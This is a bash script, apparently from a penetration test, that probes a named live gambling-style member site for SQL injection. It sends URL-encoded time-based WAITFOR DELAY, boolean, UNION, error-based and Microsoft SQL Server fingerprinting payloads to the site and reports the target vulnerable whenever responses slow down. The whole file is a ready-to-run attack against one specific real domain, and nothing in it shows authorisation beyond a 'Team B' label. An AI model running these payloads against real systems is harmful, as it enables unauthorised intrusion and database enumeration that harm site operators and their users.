#!/bin/bash

# SQL Injection Verification Script
# Team B - Panama8888b Penetration Test

BASE_URL="https://member.panama8888b.com/public/js/v2/app.js"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[+] SQL Injection Verification Tool${NC}"
echo -e "${GREEN}[+] Target: $BASE_URL${NC}"
echo "=================================================="

# Function to test SQL injection payload
test_sql_payload() {
    local payload="$1"
    local description="$2"
    local expected_delay="$3"
    
    echo -e "\n${YELLOW}[*] Testing: $description${NC}"
    echo "[*] Payload: $payload"
    
    # Test 3 times to get average
    total_time=0
    for i in {1..3}; do
        echo -n "[*] Test $i/3: "
        time_result=$(curl -s "$BASE_URL?v=$payload" -w "%{time_total}" -o /dev/null)
        echo "${time_result}s"
        total_time=$(echo "$total_time + $time_result" | bc -l)
        sleep 1
    done
    
    avg_time=$(echo "scale=3; $total_time / 3" | bc -l)
    echo -e "${GREEN}[+] Average Response Time: ${avg_time}s${NC}"
    
    # Check if delay is significant
    if [ -n "$expected_delay" ]; then
        if (( $(echo "$avg_time > $expected_delay" | bc -l) )); then
            echo -e "${RED}[!] VULNERABLE - Time delay detected!${NC}"
            return 0
        else
            echo -e "${YELLOW}[?] No significant delay detected${NC}"
            return 1
        fi
    fi
    
    return 0
}

# Test baseline first
echo -e "\n${YELLOW}[*] Testing Baseline Performance${NC}"
test_sql_payload "25.1" "Normal Request" ""

# Test time-based SQL injection payloads
echo -e "\n${YELLOW}[*] Testing Time-Based SQL Injection${NC}"

# URL encode the payloads properly
PAYLOAD1="25.1%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--"
PAYLOAD2="25.1%29%29%20WAITFOR%20DELAY%20%270%3A0%3A3%27%20--"  
PAYLOAD3="25.1%29%29%20WAITFOR%20DELAY%20%270%3A0%3A1%27%20--"

test_sql_payload "$PAYLOAD1" "WAITFOR DELAY 5 seconds" "4.0"
test_sql_payload "$PAYLOAD2" "WAITFOR DELAY 3 seconds" "2.5"
test_sql_payload "$PAYLOAD3" "WAITFOR DELAY 1 second" "1.5"

# Test boolean-based SQL injection
echo -e "\n${YELLOW}[*] Testing Boolean-Based SQL Injection${NC}"

BOOL_PAYLOAD1="25.1%29%29%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20INFORMATION_SCHEMA.TABLES%29%3E0%20--"
BOOL_PAYLOAD2="25.1%29%29%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20sysobjects%20WHERE%20xtype%3D%27U%27%29%3E0%20--"
BOOL_PAYLOAD3="25.1%29%29%20AND%201%3D1%20--"
BOOL_PAYLOAD4="25.1%29%29%20AND%201%3D2%20--"

test_sql_payload "$BOOL_PAYLOAD1" "INFORMATION_SCHEMA check" ""
test_sql_payload "$BOOL_PAYLOAD2" "sysobjects check" ""
test_sql_payload "$BOOL_PAYLOAD3" "True condition (1=1)" ""
test_sql_payload "$BOOL_PAYLOAD4" "False condition (1=2)" ""

# Test UNION-based SQL injection
echo -e "\n${YELLOW}[*] Testing UNION-Based SQL Injection${NC}"

UNION_PAYLOAD1="25.1%29%29%20UNION%20SELECT%20%40%40version%20--"
UNION_PAYLOAD2="25.1%29%29%20UNION%20SELECT%20DB_NAME%28%29%20--"
UNION_PAYLOAD3="25.1%29%29%20UNION%20SELECT%20USER_NAME%28%29%20--"

test_sql_payload "$UNION_PAYLOAD1" "UNION SELECT @@version" ""
test_sql_payload "$UNION_PAYLOAD2" "UNION SELECT DB_NAME()" ""
test_sql_payload "$UNION_PAYLOAD3" "UNION SELECT USER_NAME()" ""

# Advanced detection tests
echo -e "\n${YELLOW}[*] Testing Advanced Detection Methods${NC}"

# Test for error-based injection
ERROR_PAYLOAD="25.1%27%29%29%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%20COUNT%28%2A%29%2CCONCAT%28%40%40version%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29%20--"
test_sql_payload "$ERROR_PAYLOAD" "Error-based injection" ""

# Test specific Microsoft SQL Server functions
MSSQL_PAYLOAD1="25.1%29%29%20AND%20%28SELECT%20SUBSTRING%28%40%40version%2C1%2C1%29%29%3D%27M%27%20--"
MSSQL_PAYLOAD2="25.1%29%29%20AND%20LEN%28DB_NAME%28%29%29%3E3%20--"

test_sql_payload "$MSSQL_PAYLOAD1" "Microsoft SQL Server version check" ""
test_sql_payload "$MSSQL_PAYLOAD2" "Database name length check" ""

echo -e "\n${GREEN}[+] SQL Injection Verification Complete${NC}"
echo -e "${YELLOW}[*] If any payloads showed significant time delays, SQL injection is confirmed${NC}"
echo -e "${YELLOW}[*] Check the response times above for evidence of successful injection${NC}"